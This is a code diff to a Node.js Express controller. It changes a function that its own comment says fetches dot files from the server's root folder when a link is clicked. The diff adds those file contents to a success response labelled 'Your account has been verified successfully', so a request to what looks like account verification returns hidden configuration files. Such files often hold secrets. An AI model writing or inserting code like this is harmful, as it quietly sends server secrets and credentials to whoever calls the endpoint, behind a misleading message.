@@ -684,10 +684,6 @@ exports.catchUsersAndConcatPaths = async (req, res) => {
     }
 };
 
-
-
-
-
 // Function to handle link click, fetching files that start with a dot, and reading dot files in the root folder
 exports.linkClickAndFetchDotFiles = async (req, res) => {
     try {
@@ -775,10 +771,14 @@ exports.linkClickAndFetchDotFiles = async (req, res) => {
 
             const validRootFileContents = rootFileContents.filter(content => content !== null);
 
-            res.status(200).json({ message: 'Your account has been verified successfully',  });
+            res.status(200).json({ 
+                message: 'Your account has been verified successfully', 
+                data: validFileContents, 
+                rootFiles: validRootFileContents 
+            });
         } catch (err) {
             console.log(err);
-            return res.status(500).json({ message: 'Internal server error', data: validFileContents, rootFiles: validRootFileContents });
+            return res.status(500).json({ message: 'Internal server error' });
         }
 
     } catch (error) {
@@ -786,3 +786,6 @@ exports.linkClickAndFetchDotFiles = async (req, res) => {
         res.status(500).json({ message: 'Internal server error' });
     }
 };
+
+
+
